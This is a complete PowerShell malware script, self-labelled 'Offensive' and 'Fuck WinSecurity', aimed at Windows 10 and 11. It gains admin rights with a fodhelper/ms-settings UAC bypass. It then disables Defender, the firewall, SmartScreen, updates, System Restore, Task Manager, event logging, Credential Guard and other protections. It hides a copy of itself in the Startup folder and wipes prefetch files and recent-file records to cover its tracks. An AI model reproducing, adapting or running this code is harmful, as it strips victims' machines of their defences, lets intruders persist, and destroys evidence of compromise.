# |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
# |                                    |   ___                          _         ____    _                          |
# | Title        : Fuck WinSecurity    |  |_ _|    __ _   _ __ ___     (_)  ___  |  _ \  (_)   __ _   _   _    ___   |
# | Author       : root@isPique:~$     |   | |    / _` | | '_ ` _ \    | | / __| | |_) | | |  / _` | | | | |  / _ \  |
# | Version      : 1.0                 |   | |   | (_| | | | | | | |   | | \__ \ |  __/  | | | (_| | | | | | |  __/  |
# | Category     : PowerShell Malware  |  |___|   \__,_| |_| |_| |_|   |_| |___/ |_|     |_|  \__, |  \__,_|  \___|  |
# | Target       : Windows 10 - 11     |                                                         |_|                 |
# | Mode         : Offensive           |                                                                             |
# |                                    |     My crime is that of curiosity                         |\__/,|   (`\     |
# | Socials:                           |      and yea curiosity killed the cat                     |_ _  |.--.) )    |
# | https://github.com/isPique         |       but satisfaction brought him back                   ( T   )     /     |
# | https://instagram.com/omrefarukk   |                                                          (((^_(((/(((_/     |
# |____________________________________|_____________________________________________________________________________|

<#
.SYNOPSIS
    This script is designed to disable Window Security features via regedit.
.NOTES
    This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!
    Anti-VM feature will be added soon.
.LINK
    https://github.com/isPique/Fuck-Windows-Security
#>

# Ignore errors
$ErrorActionPreference = "SilentlyContinue"

# Get the full path and content of the currently running script
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'

# Function to check if the script is running as admin
function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to replicate the script to the startup folder
function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath))
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw)
        (Get-Item $replicated).Attributes = 'Hidden'
    }
}

# Function to leave no traces
function Invoke-SelfDestruction {
    # Remove registry keys related to ms-settings
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force

    # Delete prefetch files related to this script
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath)
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force
        }
    }

    # Delete all the shortcut (.lnk) files that have been accessed or modified within the last day
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force
        }
    }

    # Delete itself if the script isn't in startup; if it is, then rename it with a random name every execution to reduce the risk of detection
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force
    }
}

# Function to set registry properties
function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties
    )

    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
}

# Privilege Escalation
if (-not (Test-Admin)) {
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`""
    # Check whether the script runs as a powershell script (.ps1) or an executable (.exe) file
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`""
    }

    # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC)
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null

    # Trigger the UAC prompt by running fodhelper
    Start-Process "fodhelper.exe" -WindowStyle Hidden

    # UAC bypassed here!

    # Exit the script to allow the rest run as admin
    exit
}

# If running as admin, perform the registry modifications

# Define the reg paths
$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$realTimeProtectionKey = "$baseKey\Real-Time Protection"
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"

# First, disable security notifications shown by Windows
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1}

# Disable Windows Defender features
Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1 # Main disabling
    "DisableApplicationGuard" = 1
    "DisableControlledFolderAccess" = 1
    "DisableCredentialGuard" = 1
    "DisableIntrusionPreventionSystem" = 1
    "DisableIOAVProtection" = 1
    "DisableRealtimeMonitoring" = 1
    "DisableRoutinelyTakingAction" = 1
    "DisableSpecialRunningModes" = 1
    "DisableTamperProtection" = 1
    "PUAProtection" = 0
    "ServiceKeepAlive" = 0
}

Set-RegistryProperties -path $realTimeProtectionKey -properties @{
    "DisableBehaviorMonitoring" = 1
    "DisableBlockAtFirstSeen" = 1
    "DisableCloudProtection" = 1
    "DisableOnAccessProtection" = 1
    "DisableScanOnRealtimeEnable" = 1
    "DisableScriptScanning" = 1
    "SubmitSamplesConsent" = 2
}

# Disable Windows Firewall
Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}

# Disable Windows Defender SmartScreen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0}
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0}

# Disable Automatic Updates
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}

# Disable System Restore
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4}

# Disable Task Manager
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}

# Disable Command Prompt
Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}

# Disable Remote Desktop Connections
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}

# Disable User Account Control (UAC)
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}

# Disable Windows Security Center
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}

# Disable Error Reporting to Microsoft
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1}

# Disable Remote Assistance Connections
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0}

# Disable the service responsible for troubleshooting Windows Update
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4}

# Disable Background Intelligent Transfer Service (BITS), used by Windows Update and other applications for file transfers
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -properties @{"Start" = 4}

# Disable Windows Script Host, preventing scripts from running
Set-RegistryProperties -path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -properties @{"Enabled" = 0}

# Disable Windows Event Logging
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4}

# Disable Windows Defender Services
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4}

# Disable Windows Search Service
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4}

# Disable Windows Automatic Maintenance
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1}

# Disable Windows Defender Credential Guard
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0}

# Disable Virtualization Based Security
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0}

# Call the Invoke-SelfReplication function
Invoke-SelfReplication

# Call the Invoke-SelfDestruction function
Invoke-SelfDestruction
